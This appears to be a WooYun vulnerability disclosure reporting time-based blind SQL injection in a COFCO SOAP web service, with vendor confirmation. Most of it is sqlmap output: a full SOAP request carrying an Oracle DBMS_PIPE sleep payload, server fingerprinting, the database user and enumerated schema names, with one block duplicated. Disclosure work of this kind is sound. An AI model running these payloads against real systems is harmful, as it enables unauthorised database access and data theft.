wybug_title: 中粮集团某站继续注入
wybug_detail: 漏洞详情 披露状态：   									2015-12-02：	细节已通知厂商并且等待厂商处理中									2015-12-03：	厂商已经确认，细节仅向厂商公开									2015-12-13：	细节向核心白帽子及相关领域专家公开									2015-12-23：	细节向普通白帽子公开									2016-01-02：	细节向实习白帽子公开									2016-01-17：	细节向公众公开  简要描述： rt 详细说明：  先看这里： WooYun: 中粮ws注入之补哪里打哪里 这个是个error-based 注入，但是厂商好像直接关闭了报错显示，导致可以继续注入，继续time-based注入：sqlmap identified the following injection point(s) with a total of 124 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <WoMai_BonusEnquiry xmlns="http://tempuri.org/">      <strCallUserCode>admin' AND 7668=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(108)||CHR(72)||CHR(85),5) AND 'KcpR'='KcpR</strCallUserCode>      <strCallPassword>1111111</strCallPassword>      <strWoMaiAccount>1111111</strWoMaiAccount>    </WoMai_BonusEnquiry>  </soap:Body></soap:Envelope>    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Oraclecurrent user:    'HQDYC'Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <WoMai_BonusEnquiry xmlns="http://tempuri.org/">      <strCallUserCode>admin' AND 7668=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(108)||CHR(72)||CHR(85),5) AND 'KcpR'='KcpR</strCallUserCode>      <strCallPassword>1111111</strCallPassword>      <strWoMaiAccount>1111111</strWoMaiAccount>    </WoMai_BonusEnquiry>  </soap:Body></soap:Envelope>    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, HR[*] IX[*] JCHT[*] JOYCITY[*] MDSYS[*] OE[*] OLAPSYS[*] ORDSYS[*] PM[*] QQTEST[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB[*] XY[*] YYAPP基于时间跑数据太累   漏洞证明：  先看这里： WooYun: wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-12-03 08:54 厂商回复： 非常感谢，马上整改！ 最新状态： 暂无
